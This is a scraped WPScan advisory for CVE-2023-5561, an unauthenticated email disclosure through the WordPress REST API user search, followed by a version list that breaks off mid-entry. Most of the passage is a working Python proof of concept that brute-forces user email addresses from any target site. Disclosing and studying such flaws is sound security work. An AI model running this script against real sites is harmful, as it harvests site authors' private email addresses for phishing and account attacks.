["https://wpscan.com/vulnerability/19380917-4c27-4095-abf1-eba6f913b441"]
title = "WP < 6.3.2 – Unauthenticated Post Author Email Disclosure | CVE 2023-5561 | WordPress Vulnerabilities"
description = "See details on WP < 6.3.2 - Unauthenticated Post Author Email Disclosure CVE 2023-5561. View the latest Wordpress Vulnerabilities on WPScan."
full_description = '''WordPress Vulnerabilities WP < 6.3.2 - Unauthenticated Post Author Email Disclosure Description WordPress does not properly restrict which user fields are searchable via the REST API. Proof of Concept from multiprocessing import Pool import requests import string import json import sys if len(sys.argv) != 2: print(f'USAGE: {sys.argv[0]} <target site root url>') sys.exit() url = sys.argv[1].rstrip('/') + '/wp-json/wp/v2/users' known_users = {} user_suffixes = [] current_suffix = '@' headers = { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136' } def bruteforce_search(txt): users = json.loads(requests.get(url, headers=headers, data=json.dumps({'search':txt})).text) return (txt, users) if __name__ == '__main__': # String comparisons in the DB are case-insensitive, so don't bother with uppercase letters dic = string.ascii_lowercase + string.digits + '!#$&\'+\/=?^_`{|}~\.-]+' p = Pool(16) users = json.loads(requests.get(url).text) # Initial round: Grab all users by their first email domain's character suffixes = [current_suffix + c for c in dic] for suffix, users in p.imap(bruteforce_search, suffixes): if len(users) > 0: print(users) for user in users: slug = user['slug'] print(f'# Added user: {slug}, suffix: {suffix}') known_users[user['slug']] = suffix # Iterate through all users for user in known_users: print(f'# Bruteforcing email domain for {user}..') foundSomething = True while foundSomething: foundSomething = False suffixes = [known_users[user] + c for c in dic] for suffix, users_found in p.imap(bruteforce_search, suffixes): for user_found in users_found: if user_found['slug'] == user: print(suffix) known_users[user] = suffix foundSomething = True break for user in known_users: print(f'# Bruteforcing email ID for {user}..') foundSomething = True while foundSomething: foundSomething = False suffixes = [c + known_users[user] for c in dic] for suffix, users_found in p.imap(bruteforce_search, suffixes): for user_found in users_found: if user_found['slug'] == user: print(suffix) known_users[user] = suffix foundSomething = True break print('# Found the following:') for user in known_users: email = known_users[user] print(f'{user} => {email}') Affects WordPress 6.3.1 Fixed in WordPress 6.3.2 6.3 Fixed in WordPress 6.3.2 6.2.2 Fixed in WordPress 6.2.3 6.2.1 Fixed in WordPress 6.2.3 6.2 Fixed in WordPress 6.2.3 6.1.3 Fixed in WordPress 6.1.4 6.1.2 Fixed in WordPress 6.1.4 6.1.1 Fixed in WordPress 6.1.4 6.1 Fixed in WordPress 6.1.4 6.0.5 Fixed in WordPress 6.0.6 6.0.4 Fixed in WordPress 6.0.6 6.0.3 Fixed in WordPress 6.0.6 6.0.2 Fixed in WordPress 6.0.6 6.0.1 Fixed in WordPress 6.0.6 6.0 Fixed in WordPress 6.0.6 5.9.7 Fixed in WordPress 5.9.8 5.9.6 Fixed in WordPress 5.9.8 5.9.5 Fixed in WordPress 5.9.8 5.9.4 Fixed in WordPress 5.9.8 5.9.3 Fixed in WordPress 5.9.8 5.9.2 Fixed in WordPress 5.9.8 5.9.1 Fixed in WordPress 5.9.8 5.9 Fixed in WordPress 5.9.8 5.8.7 Fixed in WordPress 5.8.8 5.8.6 Fixed in WordPress 5.8.8 5.8.5 Fixed in WordPress 5.8.8 5.8.4 Fixed in WordPress 5.8.8 5.8.3 Fixed in WordPress 5.8.8 5.8.2 Fixed in WordPress 5.8.8 5.8.1 Fixed in WordPress 5.8.8 5.8 Fixed in WordPress 5.8.8 5.7.9 Fixed in WordPress 5.7.10 5.7.8 Fixed in WordPress 5.7.10 5.7.7 Fixed in WordPress 5.7.10 5.7.6 Fixed in WordPress 5.7.10 5.7.5 Fixed in WordPress 5.7.10 5.7.4 Fixed in WordPress 5.7.10 5.7.3 Fixed in WordPress 5.7.10 5.7.2 Fixed in WordPress 5.7.10 5.7.1 Fixed in WordPress 5.7.10 5.7 Fixed in WordPress 5.7.10 5.6.11 Fixed in WordPress 5.6.12 5.6.10 Fixed in WordPress 5.6.12 5.6.9 Fixed in WordPress 5.6.12 5.6.8 Fixed in WordPress 5.6.12 5.6.7 Fixed in WordPress 5.6.12 5.6.6 Fixed in WordPress 5.6.12 5.6.5 Fixed in WordPress 5.6.12 5.6.4 Fixed in WordPress 5.6.12 5.6.3 Fixed in WordPress 5.6.12 5.6.2 Fixed in WordPress 5.6.12 5.6.1 Fixed in WordPress 5.6.12 5.6 Fixed in WordPress 5.6.12 5.5.12 Fixed